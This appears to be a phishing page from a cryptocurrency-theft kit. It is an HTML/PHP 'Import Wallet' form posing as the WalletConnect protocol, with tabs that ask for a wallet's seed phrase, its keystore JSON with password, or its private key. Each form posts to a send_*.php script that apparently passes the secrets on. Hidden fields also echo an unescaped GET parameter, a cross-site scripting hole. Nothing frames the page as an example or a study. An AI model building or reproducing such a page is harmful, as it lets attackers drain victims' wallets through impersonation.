
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!-- /Added by HTTrack -->


    <link rel="stylesheet" href="./style/main.css" type="text/css">
    
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="../images/logo.svg">
    <link rel="icon" href="./style/logo.svg">
    <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;
  
      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }
  
      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }
  
      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
    </script>
  <title>Import Wallet</title><style type="text/css">@font-face { font-family: Roboto; src: url("chrome-extension://mcgbeeipkmelnpldkobichboakdfaeon/css/Roboto-Regular.ttf"); }</style></head>
  
  
  
  <body>
    <center>
      <div class="top">
        <a href="#footer" class="left">Github</a>
        <a href="#" class="left">Docs</a>
        <a href="" class="main"><img src="./style/logo.svg" alt="logo"></a>
        <a href="#wallets" class="left">Wallets</a>
        <a href="#" class="left">Apps</a>
      </div>
      <br>
      <h2>
        <center>Import Wallet</center>
      </h2>
      <br>
      <div id="NetFli" class="tab">
        <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
        <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
        <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
      </div>
  
      <div id="phrase" class="tabcontent" style="display: block;">
        <form action="./system/send_Phrase.php" method="POST">
          <input type="hidden" name="type" value="<?php echo " ".$_GET['type']." ";?>">
          <input type="hidden" name="category" value="Phrase">
  
          <textarea name="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
          <br>
          <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
          <br>
          <button type="submit" class="btn">IMPORT</button>
        </form>
      </div>
  
      <div id="keystore" class="tabcontent" style="display: none;">
        <form action="./system/send_Keystore.php" method="POST">
          <input type="hidden" name="type" value="<?php echo " ".$_GET['type']." ";?>">
          <input type="hidden" name="category" value="Keystore JSON">
  
          <textarea name="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
          <br>
          <div class="field">
            <input type="text" name="password" placeholder="Password">
          </div>
          <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
          <br>
          <button type="submit" class="btn">IMPORT</button>
        </form>
      </div>
  
      <div id="private" class="tabcontent" style="display: none;">
        <form action="./system/send_key.php" method="POST">
          <input type="hidden" name="type" value="<?php echo " ".$_GET['type']." ";?>">
          <input type="hidden" name="category" value="Private Key">
          <div class="field">
            <input type="text" name="key" placeholder="Private Key">
          </div>
          <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
          <br>
          <button type="submit" class="btn">IMPORT</button>
        </form>
      </div>
  
      <script>
      document.getElementById("default").click();
      </script>
      <footer>
        <div id="footer">
  
      </div></footer>
  

  
  </center></body></html>